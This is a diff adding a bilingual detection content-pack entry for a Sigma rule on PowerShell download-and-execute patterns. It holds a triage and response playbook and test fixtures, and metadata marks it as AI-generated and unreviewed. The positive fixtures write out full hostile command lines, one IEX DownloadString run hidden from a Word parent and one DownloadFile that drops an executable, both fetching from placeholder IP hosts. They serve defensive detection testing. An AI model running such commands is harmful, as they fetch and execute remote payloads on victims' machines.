@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
+    "title": "Suspicious PowerShell Download and Execute Pattern",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso cuya línea de comandos contiene un patrón clásico de PowerShell para descargar y ejecutar código: IEX con Net.WebClient.DownloadString, o DownloadFile invocado con -command/-c. Suele indicar un stager o un downloader.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuyo CommandLine contiene variantes de 'IEX (New-Object Net.WebClient).DownloadString' o ' -command/-c (New-Object System.Net.WebClient).DownloadFile('. La comparación no distingue mayúsculas de minúsculas.",
+      "why_it_matters": "Es ejecución mediante PowerShell (ATT&CK T1059.001): el script remoto se descarga y se ejecuta en memoria, o el payload se guarda en disco. Con frecuencia es la primera etapa de malware o ransomware.",
+      "triage_steps": [
+        "Extraiga la URL, el dominio o la IP y la ruta de destino del CommandLine; anote el usuario, el host y la hora del evento.",
+        "Revise ParentImage y la cadena de procesos: Office, navegadores, wmiprvse.exe, servicios web o tareas programadas como padre elevan mucho el riesgo.",
+        "Consulte la reputación de la URL o IP y verifique en el proxy o firewall si la descarga ocurrió, junto con su tamaño y tipo de contenido.",
+        "Si se usó DownloadFile, ubique el archivo descargado, calcule su hash y revise si se ejecutó después.",
+        "Revise los procesos hijos y la actividad de red, archivos y registro en el mismo host dentro de +/- 15 minutos.",
+        "Busque el mismo CommandLine, URL o hash en otros endpoints y revise alertas anteriores del usuario y del host."
+      ],
+      "false_positives": [
+        "Instaladores de software o scripts de bootstrap que descargan paquetes desde repositorios remotos y los ejecutan.",
+        "Scripts de administración o de despliegue de TI que usan este patrón con servidores internos conocidos y documentados.",
+        "Ejercicios autorizados de red team o pruebas de penetración."
+      ],
+      "response_steps": [
+        "Valide con el dueño del sistema o con TI si la ejecución estaba autorizada y si la URL corresponde a una fuente legítima.",
+        "Si es malicioso, aísle el endpoint, bloquee la URL, el dominio o la IP en proxy y firewall, y preserve la memoria y los artefactos.",
+        "Elimine el payload y la persistencia que haya creado solo después de recolectar la evidencia; restablezca las credenciales del usuario afectado.",
+        "Restaure el host desde una imagen confiable si hay compromiso confirmado y documente los IOC para buscarlos en el resto de la red."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque este patrón exacto de descarga y ejecución rara vez aparece en uso legítimo y suele significar ejecución de código remoto en curso."
+    },
+    "en": {
+      "summary": "A process was started with a classic PowerShell download-and-execute pattern: IEX with Net.WebClient.DownloadString, or DownloadFile invoked through -command/-c. This usually means a stager or downloader.",
+      "what_it_detects": "Windows process creation events whose CommandLine contains variants of 'IEX (New-Object Net.WebClient).DownloadString' or ' -command/-c (New-Object System.Net.WebClient).DownloadFile('. Matching is case-insensitive.",
+      "why_it_matters": "This is PowerShell execution (ATT&CK T1059.001). A remote script is fetched and run in memory, or a payload is written to disk. It is often the first stage of malware or ransomware.",
+      "triage_steps": [
+        "Extract the URL, domain or IP and any destination path from CommandLine. Record the user, host and timestamp.",
+        "Check ParentImage and the process tree. Office apps, browsers, wmiprvse.exe, web servers or scheduled tasks as the parent raise the risk considerably.",
+        "Check the reputation of the URL or IP. Use proxy or firewall logs to confirm whether the download succeeded, and note its size and content type.",
+        "For DownloadFile, find the dropped file, hash it and check whether it was executed afterwards.",
+        "Review child processes and network, file and registry activity on the same host within +/- 15 minutes.",
+        "Search other endpoints for the same CommandLine, URL or hash. Review earlier alerts for this user and host."
+      ],
+      "false_positives": [
+        "Software installers or bootstrap scripts that download packages from remote repositories and run them.",
+        "IT admin or deployment scripts that use this pattern against known, documented internal servers.",
+        "Authorized red team exercises or penetration tests."
+      ],
+      "response_steps": [
+        "Ask the system owner or IT whether the execution was authorized and whether the URL is a legitimate source.",
+        "If it is malicious, isolate the endpoint and block the URL, domain or IP at the proxy and firewall. Preserve memory and artifacts.",
+        "Collect evidence first, then remove the payload and any persistence it created. Reset the affected user's credentials.",
+        "If compromise is confirmed, reimage the host from a trusted image. Record the IOCs and hunt for them across the environment."
+      ],
+      "severity_rationale": "High fits because this exact download-and-execute pattern is rare in legitimate use and usually means remote code is being run."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell launched by a Word document runs a remote script in memory with IEX and DownloadString",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.15/a.ps1')\"",
+          "UtcTime": "2024-05-14 13:22:41.118"
+        }
+      },
+      {
+        "description": "PowerShell downloads an executable to disk with -c and System.Net.WebClient.DownloadFile",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_web",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('http://198.51.100.7/update.exe','C:\\Users\\Public\\update.exe')",
+          "UtcTime": "2024-05-14 02:05:09.402"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate admin download with Invoke-WebRequest from an internal server; no WebClient download-and-execute pattern",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -command Invoke-WebRequest -Uri 'https://repo.example.com/tools/agent.msi' -OutFile 'C:\\Temp\\agent.msi'",
+          "UtcTime": "2024-05-14 15:40:12.007"
+        }
+      },
+      {
+        "description": "WebClient DownloadString is used to read a status page without IEX and without DownloadFile, so it does not match the rule",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -command $s = (New-Object Net.WebClient).DownloadString('https://status.example.org/health'); Write-Output $s",
+          "UtcTime": "2024-05-14 16:01:55.630"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
